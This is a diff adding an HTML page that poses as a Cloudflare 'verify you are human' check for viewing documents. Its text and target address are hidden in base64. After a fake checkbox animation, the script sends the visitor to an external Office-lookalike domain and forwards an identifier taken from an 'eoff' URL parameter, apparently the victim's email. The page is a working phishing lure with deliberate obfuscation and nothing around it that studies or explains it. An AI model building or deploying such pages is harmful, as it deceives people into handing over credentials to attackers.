@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        /* Re-engineered Style Map */
+        :root { --p-bg: #ffffff; --p-gray: #e2e2e2; --p-ink: #1c1c1c; --p-link: #0052cc; }
+        body { margin: 0; height: 100vh; display: grid; place-items: center; background: var(--p-bg); font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
+
+        /* Splash - Astro Icon */
+        #S_LAYER { position: fixed; inset: 0; background: var(--p-bg); display: flex; align-items: center; justify-content: center; z-index: 99; }
+        .A_LOGO { width: 95px; animation: A_ANM 2s infinite ease-in-out; }
+        @keyframes A_ANM { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.06); opacity: 1; } }
+
+        /* Gateway - Layout */
+        #G_LAYER { visibility: hidden; display: flex; flex-direction: column; align-items: center; }
+        .G_TXT { font-size: 14px; margin-bottom: 22px; color: #222; }
+
+        /* Unified Container */
+        .G_BOX {
+            display: flex; width: 385px; min-height: 70px; padding: 0 25px;
+            border: 1px solid var(--p-gray); border-radius: 2px;
+            background: #fdfdfd; align-items: center; justify-content: space-between;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.03);
+        }
+
+        /* Left Side: Interaction */
+        .L_SIDE { display: flex; align-items: center; gap: 15px; }
+        .T_ZONE { width: 26px; height: 26px; cursor: pointer; display: grid; place-items: center; }
+        .S_BOX { width: 22px; height: 22px; border: 2px solid #bbb; border-radius: 2px; background: #fff; }
+        .S_LD { width: 20px; height: 20px; border: 3px solid #eee; border-top: 3px solid var(--p-link); border-radius: 50%; animation: R_ANM 0.7s linear infinite; }
+        .S_OK { color: #1e7e34; font-size: 22px; font-weight: 900; }
+        @keyframes R_ANM { 100% { transform: rotate(360deg); } }
+
+        /* Right Side: Astro & Brand */
+        .R_SIDE { display: flex; flex-direction: column; align-items: center; pointer-events: none; }
+        .B_IMG { width: 28px; margin-bottom: 3px; }
+        .B_LBL { font-weight: 700; font-size: 15px; color: var(--p-ink); margin: 0; }
+        .B_LEG { font-size: 10px; color: #aaa; margin-top: 1px; }
+    </style>
+</head>
+<body>
+
+    <section id="S_LAYER"><img src="astro.png" class="A_LOGO"></section>
+
+    <main id="G_LAYER">
+        <div id="T1" class="G_TXT"></div>
+        <div class="G_BOX">
+            <div class="L_SIDE">
+                <div id="ACT" class="T_ZONE"><div id="IND" class="S_BOX"></div></div>
+                <span id="T2" style="font-size: 14px; color: #555;"></span>
+            </div>
+            <div class="R_SIDE">
+                <img src="astro2.png" class="B_IMG">
+                <p id="T3" class="B_LBL"></p>
+                <div class="B_LEG">Privacy • Terms</div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        (function(_0x) {
+            // Hex-encoded data map
+            const _m = {
+                msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+                btn: "dmVyaWZ5",
+                run: "dmVyaWZ5aW5nLi4u",
+                fin: "c3VjY2Vzcw==",
+                vnd: "Q2xvdWRmbGFyZQ==",
+                tgt: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
+                prm: "ZW9mZg=="
+            };
+
+            const _f = (v) => atob(v);
+            const _d = document;
+
+            // Initializer
+            _d.addEventListener("DOMContentLoaded", () => {
+                _d.getElementById("T1").innerText = _f(_m.msg);
+                _d.getElementById("T2").innerText = _f(_m.btn);
+                _d.getElementById("T3").innerText = _f(_m.vnd);
+
+                setTimeout(() => {
+                    _d.getElementById("S_LAYER").style.display = "none";
+                    _d.getElementById("G_LAYER").style.visibility = "visible";
+                }, 2100);
+            });
+
+            // Logic Handler
+            _d.getElementById("ACT").onclick = function() {
+                this.onclick = null;
+                const _i = _d.getElementById("IND");
+                const _s = _d.getElementById("T2");
+
+                _i.className = "S_LD";
+                _s.innerText = _f(_m.run);
+
+                setTimeout(() => {
+                    _i.className = "S_OK";
+                    _i.innerHTML = "✓";
+                    _s.innerText = _f(_m.fin);
+
+                    const _u = window.location.href;
+                    const _k = _f(_m.prm) + "=";
+                    const _v = _u.split(_k)[1] || "";
+
+                    setTimeout(() => {
+                        window.location.replace(_f(_m.tgt) + _v);
+                    }, 850);
+                }, 2300);
+            };
+        })(window);
+    </script>
+</body>
+</html>
